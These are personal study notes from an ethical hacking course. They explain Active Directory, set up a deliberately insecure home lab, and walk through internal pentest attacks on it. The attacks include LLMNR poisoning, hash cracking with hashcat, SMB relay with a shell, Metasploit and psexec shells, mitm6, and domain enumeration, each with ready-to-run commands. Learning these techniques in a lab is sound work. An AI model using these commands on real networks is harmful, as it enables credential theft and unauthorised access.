## Links
- [TCM](https://academy.tcm-sec.com/)
- [TCM Drive](https://www.notion.so/Ethical-Hacking-d4cc19377a5d413ab305ac4695638e8e)

-------
## ETH Notion
[[Ethical Hacking d4cc19377a5d413ab305ac4695638e8e.pdf|Notion]]

#### Enumerating SSH
- If you find ssh open => try to bruteforce the login
	2 reasons:
	1) Look for weak passwords
	2) Test if the bruteforce attack is detected or not
	
	All these 2 things are important inside a report

- If you find a file and port 80/443 open => try to connect ip/file
	  if you find this website:
	  =>  - you can upload a file using FTP
	     - execute it by accessing via browser


## Cheet
[[cheet|cheet]]

-------
# Capstones
[[Notes/TCM/Capstones/Blue/report|Blue Report]]
[[Notes/TCM/Capstones/Academy/report|Academy Report]]
[[Notes/TCM/Capstones/dev/report|Dev Report]]
[[Notes/TCM/Capstones/Butler/report|Butler Report]]
[[Notes/TCM/Capstones/Blackpearl/report|Back pearl Report]]

# Active Directory
**AD:**
- directory service developm by microsoft to manage --> <span style="color:#00b050">Win Domain Networks</span>
- <u>stores info</u> related to -->  <span style="color:#00b050">objects</span>   (as pc, users, printers...)
- authenticates using -->  <span style="color:#00b050">kerberos tickets</span>

> [!Warning] Why useful:
> - useful for <span style="color:#00b050">internal penetration testing</span>
> - even <span style="color:#00b050">no Windows machine</span> can use AD  --> using RADIUS or LDAP for 
>                                        authenticat
>                                        
>- AD is the <span style="color:#00b050">most used</span> -->  identity management 
>- <span style="color:#00b050">95%</span> of Fortune 1000 companies -->  impelement AD in their network
>- Can be exploited<span style="color:#00b050"> without attacking patchable exploits</span>
>- We abuse -->  **<span style="color:#6666ff">features</span>**, **<span style="color:#6666ff">trusts</span>** and **<span style="color:#6666ff">components</span>**

=>
everyone uses AD
=>
fundamental know what it is and how it works

## AD Component
AD is composed on:
1) Physical components
2) Logical components
![[Pasted image 20240217112645.png]]

### Physical AD Components
#### AD Domain Controllers 
- Most important component
- It controls everything
- <span style="color:#00b050">Host the AD</span>
- Provide -->  <span style="color:#00b050">authentication</span> and <span style="color:#00b050">authorization</span> services
- allow -->  <span style="color:#00b050">administrative access</span>
             =>
             to manage user accounts and network resources
#### AD DS Data Store
Contains the -->      - <span style="color:#00b050">DB files</span>
                 - <span style="color:#00b050">ntds.dit file</span>   (allows to pull sensistive info and hash passwords)
AD DS:
Is<span style="color:#00b050"> accessible only</span> through -->  Domain Controller (and protocols)

### Logical AD Components
#### AD Schema
- Defines every type of -->  <span style="color:#00b050">Objects</span>
                          that can be stored in the directory
                          
- <span style="color:#00b050">Enforces rules</span> regarding -->  object creation and configuration

<span style="color:#00b050">Object types:</span>
![[Pasted image 20240217112914.png]]

#### Domains
Used to:
- <span style="color:#00b050">group</span>
- <span style="color:#00b050">manage</span>     -->  <span style="color:#00b050">objects</span> in an organization

can be more than one domain

<span style="color:#00b050">domain example: </span>
![[Pasted image 20240217113326.png]]
#### Trees
A domain tree is -->  a hierarchy of domains in AS

all domains in the tree:
- share a namespace with parent domain
- can have addtional child domains

<span style="color:#00b050">domain tree example:</span>
![[Pasted image 20240217113343.png]]
#### Forests
forests -->  <span style="color:#00b050">collection</span> of 1 or more <span style="color:#00b050">domain trees</span>

forests:
- share a common schema
- share a common global catalog to -->  enable <span style="color:#00b050">searching</span>
- <span style="color:#00b050">enable trusts</span> -->  between all domains the forest
- share the -->  enterprise Admin and Schema Admins group

<span style="color:#00b050">forest example:</span>
![[Pasted image 20240217113825.png]]

> [!INFO] 
> we'll focus on -->  single domain 

#### Organizational Units (OUs)
OUs -->  AD containers
         =>
         can contain --> users, groups, computers ...

OUs are used to:
- represent your organization -->  <span style="color:#00b050">hierachically</span> and <span style="color:#00b050">logically</span>
- <span style="color:#00b050">manage a collection of objects</span> -->  in a consistent way
- <span style="color:#00b050">delegate permissions</span> -->  to administer groups of objects
- <span style="color:#00b050">apply policies</span>

#### Trusts
trust:
provide a mechanism for users -->  to<span style="color:#00b050"> gain access resources in another domain</span>

Type of trusts:
![[Pasted image 20240217114526.png]]

- All domains in a forest -->  trust all other domains in the forest
- Trusts can extend -->  outside the forest

#### Objects
type of objects:
![[Pasted image 20240217114741.png]]


-----
## AD LAB
### Build up
- Download from here:
	- [Windows 10 enterprise 64](https://www.microsoft.com/en-us/evalcenter/download-windows-10-enterprise)
	- [Windows Server 22 64](https://www.microsoft.com/en-us/evalcenter/download-windows-server-2022)

#### Windows Server Setup
Open [[cheet#VM Ware|VM Ware]]
Create a New VM:
- Select Install OS later > Windows Server 2022 > split disk in multi files > 60gb
- Finish 
- Then:
	- set at least 8gb RAM
	- set the ISO to the Server iso that you downloaded
	- run the vm
	- Select Custom Installation
	- Create a partition![[Pasted image 20240217152003.png]]
	- Set a password -->  `P@$$w0rd!`

Now:
install the vm tools --> [[Notes_ETH#Install VM Tools (guest addition)]]

##### Rename PC
then:
- click windows button > search name > click on View your pc Name > Rename this pc
- call it <span style="color:#00b050">HYDRA-DC</span>
- reboot

Now we need to make this machine our -->  <span style="color:#00b050">AD Domain Controller </span>
=>
##### Create our AD Domain Controller
On the Server Manager Dashboard: (the default page that is open)
- Click on Manage > Add Role and Features
- Next > Role based or feature > Next > Select Active Directory Domain Services >
     Add Features >
- Next > Next > Click restart the destination automatically if required > yes > Install
=>
We are installing our Domain Controller

<span style="color:#00b050">When it finishes the installation:</span>
- click on Promote this server to a domain controller
- Add a new Forest, called MARVEL.local   (I'm just following the tutorial)
- click Next > retype the same password as the admin `P@$$w0rd!`
- click Next until you can click on Install
- when it finishes click Close and wait for reboot

After the reboot:
<span style="color:#00b050">we'll enter inside our domain "marvel"!</span>
![[Pasted image 20240217154740.png]]

##### Create a Certificate Service
Last thing after the reboot:
we need to do again the same steps for adding -->  the Certificate Service
We need this to -->  <span style="color:#00b050">verify the identity of the Domain Controller</span>
=>
- Click on Manage > Add Role and Features
- Next > Role based or feature > Next > Select Active Directory Certificate Services > Add Features >
- Next > Next > Next >Click restart the destination automatically if required > yes > Install

<span style="color:#00b050">When it finishes the installation:</span>
- click on Configure Active Directory Certificate Services on the dest server
- Next > Select Certificate Authority > Next Until Validity > Select 99  years
- Click Next until you can click Configure
- When it finishes -->  Close > Close > Reboot
- Login and then Shutdown the VM

#### Windows Machines
- Create a new VM > Select the windows ISO > Select Windows 10 enterprise
- Click Next > Select as Virtual Machine Name "<span style="color:#00b050">THEPUNISHER</span>" > Next > 60 gb
- Finish

Customize the VM:
- Remove the floopy disk
- Select memory to 5 gb
- Run

Now:
recreate a second machine indentical to this one
Select as Virtual Machine Name "<span style="color:#00b050">SPIDERMAN</span>"

In both we need to do the same steps:
- Run them
- Select Custom Installation
- Create a partition as in the Domain Controller Machine
- when you arrive here:![[Pasted image 20240217162901.png]]
- Click on domain join instead 
- call SPIDERMAN -->  <span style="color:#00b050">peterpark</span>
- call THEPUNISHER -->  <span style="color:#00b050">frankcastle</span>
- set password -->  `Password1`
- set all the answers to `bob`
- deselect all
- skip cortana
- <span style="color:#00b050">the machine will enter inside windows</span>
- install the [[Notes_ETH#Install VM Tools (guest addition)|VMWare Tools]] and restart
- change the [[Notes_ETH#Rename PC|pc name]] and reboot
- Shutdown both

:)

##### Install VM Tools (guest addition)
Inside the VM go to the upper bar:
- Virtual Machine > Install VMWare Tools
- It should open the autorun inside the VM for installing the tools
- if not open the file explorel inside the VM and search for VMWare Tools and run the setup64



#### Setting Up Users, Groups, and Policies
Now we are going to set -->  Users, Groups and Policies
Why:
- to exploit them after in the course 
- see some of the wrong things that the people set with AD
=>
##### Add Users
Run the Domain Controller
From the Server Manager:
- click on Tools > Active Directory Users and Computers
- click on MARVEL.local > right click on it > New > Organizational Unit
- Name it `Groups`
- Move these selected groups to the folder that we have created (type yes)![[Pasted image 20240217172153.png]]
- Move even these to the same folder ![[Pasted image 20240217172306.png]]

<span style="color:#00b050">Now we are going to create new root and normal users:</span>
- right click on Administrator > Copy
- create user Tony Stark with user logon name = tstark > Next > put `Password1` > 
     set Password never expires > Next > Finish
- do the same => create usr SQL(first name) Sevice(second name), logon name = SQLService >
      put `MYpassword123#` > set Password never expires > Next > Finish
- double click on SQL Service > set the description as `The password is MYpassword123#`
> [!warning] 
> this is something that some people do
> They think that is secure to put the password inside the description... but it is not

- right click on white space under the user > New > User
- create users for our machine THEPUNISHER and SPIDERMAN 
     =>
  - first user Frank Castle logon name = fcastle and put `Password1`  > set only password never expires > Next > Finish
  - same things with Peter Park logon name = ppark and put `Password2` > and =
 - quit

From the Server Manager:
- click on File and Storage Services > Shares > New Share > Next > Next >
- Share name = hackme > Next > Next > Create

##### Set up the Service Account
open cmd ad admin
`setspn -a HYDRA-DC/SQLService.MARVEL.local:60111 MARVEL\SQLService`

##### Set up a Group Policy 
<span style="color:#00b050">Now we are going to disable Microsoft windows defender:</span> (to make  easier the course)
- click win button > search for Group Policy Management 
- Right click on MARVEL.local > Create a GPO ...![[Pasted image 20240217174005.png]]

- Named in Disable Windows Defender
- right click on Disable Windows Defender > Edit >
- ![[Pasted image 20240217174259.png]]
- Navigate to Windows Components > search for Microsoft Defender Antivirus
- On the right panel double click on -->  Turn off Microsoft Defender Antivirus
- select Enable > Apply > Ok
- Return to the Disable Windows Defender > right click > Enforced 
     =>  every time a user/pc join this domain, it will apply this policy

##### Set a static IP
- open a cmd and type `ipconfig` 
- copy the IP and the default gateway
- go here ![[Pasted image 20240218112436.png]]![[Pasted image 20240217174814.png]] 
- click on Properties > Internet Protocol Version 4 > set the ip and default gateway to values found inside cmd (`ip = 172.16.214.128`)


<span style="color:#00b050">shutdown the Domain Controller </span> 



#### Joining our machines to the Domain
Now we can:
- reduce the RAM of Domain Controller
- login inside all the 3 machines

For the 2 windows machines:
- go here![[Pasted image 20240218112424.png]]

- Right Click on Ethernet > Properties > Internet Protocol Version 4 
- Set the DNS server address as our Domain Controller IP  (`172.16.214.128`)

<span style="color:#00b050">Now we want to join our domain:</span>
- click win button > search domain > click on Access work or school > Connect
- click Join this device to a local Active Directory domain
- enter the domain name --> `MARVEL.local`
- insert the admin credentials -->  `administrator - P@$$w0rd!`
- User account and Account type both administrator type
- Restart
- do the same for the other windows machine

<span style="color:#00b050">Check if the windows machines are connected to our domain:</span>
- login inside Domain Controller
- from the Server Manager Dashboard:
	- click on Tools > Active Directory Users and Computers > MARVEL.local > Computers
	- Check that you can see the 2 win machines![[Pasted image 20240218115809.png]]

<span style="color:#00b050">let's go back to THEPUNISHER</span>
- login as MARVEL\administrator  (type `P@$$w0rd!`)
- we want to add some local administrator accounts:
	- click win button > search Edit local users and groups 
	- now we'll enable the local Administrator account:  (bad practice that people do)
		- right click Administrator > Set Password > `Password1!` > Ok
		- double click into Administrator > uncheck Account is disabled > Ok
		  
     - click on Groups > Administrator > Add > type fcastle > Check Names > Ok > Apply
	 - close all these tabs
- now we enable the Network:
	- click on the file explorer
	- Network > click Ok on the error that you'll see > double click on this![[Pasted image 20240218120958.png]]
	- click on Turn on network discovery and file sharing
	- <span style="color:#00b050">Now we can see our Domain Controller!</span>

<span style="color:#00b050">let's do all the same steps into SPIDERMAN:</span>
- but we'll add 2 users this time:
	- all the same steps
	- click on Groups > Administrator > Add > type pparker > Check Names > Ok > Apply
	- click on Groups > Administrator > Add > type fcastle > Check Names > Ok > Apply
	- continue with the same steps

  - now logout as this administrator account (win button > Administrator > Sign out)
  - <span style="color:#00b050">sign in as local administrator:</span>
	  - `.\peterparker`
	  - `Password1`
  - click on file explorer > This PC > Computer > Map network drive (4 in the img is a mistake)![[Pasted image 20240218121654.png]]
	- write as folder -->  `\\HYDRA-DC\hackme`
	- enable Connect using different  > Finish
	- enter the administrator credential -->  `administrator - P@$$w0rd!`
	- <span style="color:#00b050">Now we have a share drive into our machine!</span>![[Pasted image 20240218121954.png]]

**WE HAVE FINISHED THE AD LAB SETUP :)**


### Intro AD Attacks
Scenario that we are going to simulate:
- we have a client
- we are performing a pentest
- as a company we send a laptop to the client
	- inside the laptop there is a VPN connection
	- if the VPN connection is enabled:
		- => the pentest team can connect to the VPN
		- => we can run the attacks remotely 
		- 
> [!info] 
> This is the typical scenario for a pentester
> =>
> you don't need anymore to go phisicaly to the client company

=>
	the idea is that -->  - the client laptop has been compromised
					 - we are going to run different attacks
 
#### LLMNR Poisoning
Most common attack in -->  internal penetatrion test

LLMNR = <span style="color:#00b050">Link Local Multicast Name Resolution</span> 
         - protocol used to **identify hosts when DNS fails to do so****
         - previously called NBT-NS

Workflow attack:
![[Pasted image 20240225102230.png]]
the service uses:
- username
- hash                -->   when someone appropriately responded to
  
=>
if we respond to the server in the right way =>    - the server will send us the username + hash
                                         - we can try to decrypt the hash

##### Responder
we'll use the tool [[cheet#Responder|responder]] -->  to perform this attack
=>
`sudo python3 Responder.py -I vmnet8 -dwv`

from THEPUNISHER:
- login as fcastle with Password1
- open file explorer
- type in the bar -->  `\\ip attacker`
=>
<span style="color:#00b050">we have capture hash</span>
![[Pasted image 20240225110349.png]]

##### Crack the password
save the hash inside a file called hash.txt =>  `echo fcastle::MARVEL:... > hash.txt`
- we'll use [[cheet#hashcat]]
- we have captured an -->  NTLMv2 hash
  =>
  we need to find the hashcat module for NTLMv2
  =>
- `hashcat --help | grep NTLM`![[Pasted image 20240225111403.png]]
  =>
  the module is -->  5600

=>
`hashcat -m 5600 hash.txt rockyou.txt`
=>
![[Pasted image 20240225112104.png]]
<span style="color:#00b050">password found :)</span>

##### LLMNR Mitigation
Best defence:
- disable LLMNR and NBT-NS

If you need this protocol => best practice:
- require Network Access Control
- use really strong strong password

#### SMB Relay Attack
Instead of cracking hashes obtained with Responder:
we can -->      - relay those hashes with SMB
            - gain access to a machine

<span style="background:#fff88f">requirements for this attack:</span>
- SMB signing -->  must be disabled 
- relayed user credentials -->  must be admin on machine (for any real value)

attack steps:
1) Identify hosts without SMB Signing
2) use Responder (but with modification to Responder.conf => SMB and HTTP OFF)
3) use ntlmrelayx.py
4) from the victim side we need an event that occurs

##### Identify host without SMB Signing (nmap)
`nmap --script=smb2-security-mode.nse -p445 <DomainControllerIP> -Pn`
`-Pn` -->  treat all hosts as online
=>
`nmap --script=smb2-security-mode.nse -p445 172.16.214.128 -Pn`
This is the message that we are looking for:
![[Pasted image 20240226103728.png]]

=>
create a .txt file and insert the Domain Controller IP -->  called targets.txt

##### Modify and use Responder
We need to disable -->  SMB and HTTP
`sudo vi ~/Desktop/TCM/tools/Responder`
change to Off -->  SMB and HTTP

now we can use it:
`sudo python3 Responder.py -I vmnet8 -dwv`

##### Set up NTLM relay (ntlmrelayx.py)
`ntlmrelayx.py -tf targets.txt -sm2support` 
`-tf` -->  target file

##### Victim Event Occurs
from THEPUNISHER:
- login as fcastle with Password1
- open file explorer
- type in the bar -->  `\\ip attacker`
=>
if we look at our terminal with `ntlmrelayx.py':
<font color="#2DC26B">we have found Aministrator and Peter Parker hashes</font>
![[Pasted image 20240226104434.png]]

##### Another possible Attack
`ntlmrelayx.py -tf targets.txt -sm2support -i`
`-i` -->  interactive mode
=>
if we create again another event inside the victim:
<span style="color:#00b050">we obtain a shell via TCP</span>
![[Pasted image 20240226105252.png]]
=>
we need to bind to that shell:
`nc 127.0.0.1 11000`
![[Pasted image 20240226105537.png]]
if we type `help` -->  we can see all the commands that we can use

##### SMB Relay Mitigation
<span style="background:#fff88f">Possibile mitigation:</span>
![[Pasted image 20240226110048.png]]

#### Gaining Shell Access
we can do in different ways

##### Metasploit
`msfconsole`
`search psexec`    and look for exploit/windows/smb/psexec
`use <number>`
`options`
`set payload windows/x64/meterpreter/reverse_tcp`
`set RHOST <THE PUNISHER IP>`      172.16.214.130
`set smbdomain MARVEL.local`
`set smbuser fcastle`
`set smbpass Password1`
`run`

> [!warning] If it fails:
> type `show targets`
> and try with PowerShell or Native upload

##### psexec.py
`sudo psexec.py MARVEL/fcastle:'Password1'@172.16.214.130`
[[cheet#psexec.py]]
![[Pasted image 20240226112845.png]]

#### IPv6 Attacks
In some machines IPv6:
-  is enabled
- but is not used
=>
if IPv6 is on:
<span style="background:#fff88f">who is doing DNS resolution for it?</span>
                 <span style="color:#00b050">usually no one</span>
=>
we can set up a fake DNS -->  using [[cheet#mitm6]]

##### mitm6
follow all the steps --> [[cheet#mitm6|here]]
if you reboot THEPUNISHER:
- you will obtain a lot of information
- if you go inside your lootme_folder you will find some of them 

##### IPv6 Mitigation
![[Pasted image 20240226122019.png]]


#### Passback Attacks
Multi-Function Peripherals (MFPs) -->  are devices that must be considered during an internal 
                                 pentesting
What can a printer brings:
- Credential Disclosure
- File System Access
- Memory Access

Here you can read about it --> [How to Hack Through a Pass-Back Attack: MFP Hacking Guide](https://www.mindpointgroup.com/blog/how-to-hack-through-a-pass-back-attack)

### Initial Internal attack strategy
what are the things that you want to do in an internal pentest:
- using Responder or mitm6 
> [!info] Best time to run Responder:
> - in the morning before users login 
> - after lunch 
>   =>
>   the best time is -->  when there is a lot of traffic

- run scans (as nessus scan) -->  to generate traffic
- if scans take too long and we don't find any respond =>  start looking for websites in scope
												 (using `http_version`)
- look for default credential on web logins:
	- Printers
	- Jenkins
	- etc




### Post-Compromise Enumeration
What happen after we have compromised a domain:
we go back to do -->  <span style="color:#00b050">enumeration</span>

once we have a valid account in a domain:
we have the ability to get -->  a lot of information 

####  Domain Enumeration with ldapdomaindump
[[cheet#ldapdomaindump|ldapdomaindump]] 
`mkdir marvel.local`
`sudo ldapdomaindump ldaps://172.16.214.128 -u 'MARVEL\fcastle' -p Password1 -o marvel.local'

we'll find all the information obtained inside the -->  marvel.local folder
first thing we want to know:
<span style="color:#00b050">which are our high value targets </span> => lets open the <span style="background:#fff88f">domain_users_by_group </span><span style="background:#fff88f">file</span> (inside marvel dir)
![[Pasted image 20240301143955.png]]

As you can remember:
- during active directory setup in the [[Notes_ETH#Add Users]]
- we created a user SQL and we write in the description -->  the password
- as you can see from the image -->  with this tool <span style="color:#00b050">we found that password </span>

we can also see:
- all the accounts -->  inside the same file
- all the hosts -->  inside the <span style="background:#fff88f">domain_users file </span>


#### Domain Enumeration with Bloodhound
follow these [[cheet#bloodhound|steps]]

